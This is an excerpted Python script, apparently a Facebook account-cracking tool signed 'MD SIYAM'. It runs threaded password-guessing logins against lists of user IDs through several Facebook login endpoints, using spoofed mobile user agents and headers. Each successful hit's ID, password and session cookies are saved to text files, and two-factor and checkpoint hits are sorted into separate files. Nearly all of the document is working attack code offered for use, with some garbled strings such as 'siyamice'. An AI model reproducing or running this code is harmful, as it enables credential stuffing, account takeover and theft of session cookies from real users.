...
try:
    ...
    os.system('pip install mechanize requests futures==2 > /siyam/null')
    os.system('python siyam.py')
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
...
siyamua =["Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Safari/537.36",
...
os.system("xdg-https://facebook.com/groups/417519034701028/")
os.system("clear")
...
\033[1;32m      ╚══════╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝                                         
===============================================
 [â¢]\033[1;37m AUTHOR       : \033[1;37m MD SIYAM
 [â¢]\033[1;37m TOOL STATUS  :\033[1;37m FREE
 [â¢]\033[1;37m TOOL VERSION :\033[1;37m  0.1 (just fire) 
==============================================="""
...
def menu():
    ...
    print(" [6] EXIT TOOL ")
    linex()
    siyamv = input("âCHOOSE> ")
    if siyamv =='1':f_clone()
    elif siyamv =='2':r_clone()
    elif siyamv =='3':n_clone()
    elif siyamv =='4':g_clone()
    elif siyamv =='5':os.system("xdg-https://facebook.com/groups/417519034701028/");menu()
    elif siyamv =='6':exit()
    else:
...
def f_clone():
   ...
   #print(" [1] CRACK WITH AUTO PASS ")
    ...
    if p == "1":
        ...
        linex()
        for siyam in range(plimit):
            ap = input(f" [{siyam+1}] ENTER PASSWORD : ")
            plist.append(ap)
    with ThreadPool(max_workers=30) as siyam_xd:
        clear()
        tl = str(len(idz))
        ...
        for love in idz:
            uid, name = love.split("|")
            pwx = plist
            if m == "1":siyam_xd.submit(freefb, uid, name, pwx, tl)
            elif m == "2":siyam_xd.submit(bapi, uid, name, pwx, tl)
            elif m == "3":siyam_xd.submit(graph, uid, name, pwx, tl)
            else:
                siyam_xd.submit(graph, uid, name, pwx, tl)
    linex()
...
def r_clone():
    ...
    siyamv = input("âCHOOSE> ")
    if siyamv =='1':siyam1()
    elif siyamv =='2':siyam2()
    elif siyamv =='3':siyam3()
    elif siyamv =='4':siyam4()
    elif siyamv =='5':siyam5()
    elif siyamv =='6':siyam6()
    else:
        print("SELECT CORRECT OPTION")
        time.sleep(1)
        menu()
...
def siyam1():
    ...
    with ThreadPool(max_workers=30) as siyam_xd:
        ...
        print(f'[+] YOUR METHOD CHOOSED : M{siyamfire}')
        ...
        for love in user:
            ...
            if siyamfire =='1':siyam_xd.submit(mbasic,uid,pwx,tl)
            elif siyamfire =='2':siyam_xd.submit(p,uid,pwx,tl)
            elif siyamfire =='3':siyam_xd.submit(x,uid,pwx,tl)
            elif siyamfire =='4':siyam_xd.submit(mobile,uid,pwx,tl)
            elif siyamfire =='5':siyam_xd.submit(freeq,uid,pwx,tl)
            elif siyamfire =='6':siyam_xd.submit(d,uid,pwx,tl)
            else:
                siyam_xd.submit(p,uid,pwx,tl)
    linex()
    print('[â] CRACK PROCESS COMPLETE')
    print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
    print('[â] ID SAVE SIYAM-OK TXT')
    linex()
...
def g_clone():
    ...
    os.system('clear')
    print(logo)
    print(" Ex First : ayesha, kazim, siyam ")
...
def freefb(uid, name, pwx, tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [siyam-M1] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
        ...
        for ps in pwx:
            ...
            'method': 'POST',
            'path': '/login/siyamice-based/login/async/',
            'scheme': 'https',
            'content-length': '294',
            ...
            lo = session.post("https://mbasic.facebook.com/login/siyamice-based/password/?uid=100095733750131&flow=login_no_pin&refsrc=deprecated&_rdr", data=data, headers=headers).text
            log_cookies = session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                coki = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                print(f" {green}[siyam-OK] {uid}|{pw}")
                print(f" {white}[COOKIES] {green}{coki}")
                open("/sdcard/siyam_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                oks.append(uid+"|"+pw)
                break
            elif "checkpoint" in log_cookies:
                if "Enter login code to continue" in log_cookies:
                    print(f" {cyan}[siyam-2F] {uid}|{pw}")
                    open("/sdcard/siyam_file_2F.txt", "a").write(f"{uid}|{pw}\n")
                    twf.append(uid+"|"+pw)
                    break
                else:
                   #print(f" {red}[siyam-CP] {uid}|{pw}")
                    open("/sdcard/siyam_file_cp.txt", "a").write(f"{uid}|{pw}\n")
                    cps.append(uid+"|"+pw)
                    break
            else:
                continue
...
def bapi(uid, name, pwx, tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [siyam-M2] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
        ...
        for ps in pwx:
            ...
            data = {
                ...
                'cpl': 'true',
                'try_num': '1',
                'family_siyamice_id': str(uuid.uuid4()),
            ...
            if "session_key" in result:
                ...
                print(f" {red}[siyam-CP] {uid}|{pw}")
                open("/sdcard/siyam_file_tf.txt", "a").write(f"{uid}|{pw}\n")
                cps.append(uid+"|"+pw)
                break
            else:
                continue
...
def graph(uid, name, pwx, tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [siyam-M3] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
        ...
        for ps in pwx:
            ...
            headers = {
                ...
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-siyamice-group': str(random.randint(2000, 4000)),
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
...
def mbasic(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M1-siyam] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
                ...
                if "live" in c:
                    if result["is_account_confirmed"] == False:
                       ...
                       #print(f" {green}[COOKIES] {green}{coki}")
                        open("/sdcard/siyam-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                    else:
                        print(f" {green}[siyam-OK] {uid}|{pw}")
                       #print(f" {green}[COOKIES] {green}{coki}")
                        open("/sdcard/siyam_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                        oks.append(uid)
                        break
            else:
                continue
...
def p(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M2-siyam] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
...
def x(uid,pwx,tl):
    ...
    global cps
    global siyamua
    sys.stdout.write('\r\33[1;37m[M3-siyam] %s|OK:%s \r'%(loop,len(oks))),
    sys.stdout.flush()
    try:
        for ps in pwx:
    ...
    'viewport-width': '980',
            ...
            lo = session.post('https://x.facebook.com/login/siyamice-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            ...
            if 'c_user' in log_cookies:
                ...
                if "live" in check_lock(cid):
                    if '%3A-1%3A-1' in coki:
                        print('\33[1;94m[siyam-NV] '+cid+' | '+ps+'\33[0;97m')
                        break
                    else:
                        print('\33[1;92m[siyam-OK] '+cid+' | '+ps+'\33[0;97m')
                        if "yes" in cookie_show:
                            print(f"\033[1;32mCOOKIES : {coki}")
                            open('/sdcard/siyam-Rndm-Ok.txt', 'a').write(f'{cid}|{ps}|{coki}\n')
                            oks.append(cid)
                            break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                if "Enter login code to continue" in log_cookies:
                    #print('\33[1;94m[siyam-2F] '+uid+' | '+ps+'\33[0;97m')
                    open('/sdcard/siyam-2f.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                    break
                else:
                    #print('\33[1;91m[siyam-CP] '+uid+' | '+ps+'\33[0;97m')
                    open('/sdcard/siyam-Cp.txt', 'a').write(uid+' | '+ps+'\n')
                    cps.append(uid)
                    break
            else:
                continue
...
def mobile(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M4-siyam] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
...
def freeq(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M5-siyam] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
...
def d(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M6-siyam] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
...
def cracker(uid, pwx, tl):
    ...
    global twf
    global loop
    sys.stdout.write(f"\r {green}(siyam) ({loop}) (OK-{len(oks)})\r"),
    sys.stdout.flush()
    try:
        first6digit = uid[0:6]
        first7digit = uid[0:7]
...
"Mozilla/5.0 (Linux; Android 12; SM-N970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]",
            ...
            if "c_user" in response:
                ...
                if "live" in check:
                    if '%3A-1%3A-1' in coki:
                        print(f" {cyan}(siyam-2F) {cid}|{pw} ")
                        break
                    else:
                        print(f" {green}(siyam-OK) {cid}|{pw} ")
                       #print(f" {white}Cookie : {green}{coki}")
                        open("/sdcard/siyam-Number-ok.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                        oks.append(cid)
                        break
                else:
                    break
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\33[1;91m[siyam-CP] '+uid+' | '+pw+'\33[0;97m')
                open('/sdcard/siyam-Cp.txt', 'a').write(uid+' | '+pw+'\n')
                cps.append(uid)
                break
            else:
                continue
